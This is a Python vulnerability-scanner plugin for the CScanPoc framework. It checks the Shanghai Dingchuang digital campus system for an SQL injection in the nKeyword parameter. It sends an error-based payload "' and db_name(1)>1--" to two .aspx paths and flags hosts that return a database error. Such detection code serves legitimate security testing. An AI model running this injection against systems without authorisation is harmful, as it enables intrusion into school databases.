# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Goodo-edu_0007'  # 平台漏洞编号，留空
    name = '上海鼎创通用型数字校园系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-02'  # 漏洞公布时间
    desc = '''
        上海鼎创通用型数字校园系统是由上海鼎创信息科技有限公司打造的校园数字一体化管理系统。
        上海鼎创通用型数字校园系统 /EduPlate/VideoOnDemand/Web/search.aspx，nKeyword参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0105271'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '上海鼎创通用型数字校园系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9a496735-505c-4a5b-9b53-ae161c56ea9b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-0105271
            # refer:http://www.wooyun.org/bugs/wooyun-2010-0105268
            hh = hackhttp.hackhttp()
            payloads = [
                '/EduPlate/VideoOnDemand/list.aspx?SID=0&KEYwordType=1&nKeyword=11',
                '/EduPlate/VideoOnDemand/Web/search.aspx?nKeyword='
            ]
            getdata = '%%27%20and%20db_name%281%29%3E1--'
            for payload in payloads:
                code, head, res, err, _ = hh.http(
                    self.target + payload + getdata)
                if code == 500 and 'master' in res:
                    #security_hole(arg+payload+" :sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
